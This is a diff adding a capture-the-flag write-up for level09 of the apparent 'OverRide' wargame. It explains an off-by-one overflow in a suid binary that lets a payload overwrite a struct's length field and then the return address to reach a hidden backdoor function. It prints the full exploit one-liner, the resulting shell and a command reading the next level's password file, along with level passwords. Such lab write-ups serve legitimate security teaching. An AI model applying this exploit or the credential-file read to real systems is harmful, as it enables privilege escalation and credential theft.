@@ -1,0 +1,24 @@
+Authenticating as level09/fjAwpJNs2vvkFLRebEvAQ2hFZ4uQBWfHRsP62d8S
+
+We come across a suid binary named level09.
+
+After analyzing the binary it seems that it has a buffer overflow where it does strcpy source to the destination with the size of 41 while the destination
+is only 40bytes.
+
+While the destination is a struct if we wrote at the 40 position we will be able to overwrite the size in the struct. in which will allow us to change the size
+in here:
+	strncpy(string,buffer,(long)*(int *)(string + 180));
+Thus if the size is more than 200bytes, we will be able to overwrite the rip. and Execute the secret_backdoor function
+
+level09@OverRide:~$ (python -c "print '\x90' * 40 + '\xd0\n' + '\x90' * 200 + '\x00\x00\x55\x55\x55\x55\x48\x8c'[::-1]"; cat) | ./level09
+--------------------------------------------
+|   ~Welcome to l33t-m$n ~    v1337        |
+--------------------------------------------
+>: Enter your username
+>>: >: Welcome, �����������������������������������������>: Msg @Unix-Dude
+>>: >: Msg sent!
+sh
+whoami
+end
+cat /home/users/end/.pass
+j4AunAPDXaJxxWjYEUxpanmvSgRDV3tpA5BEaBuE
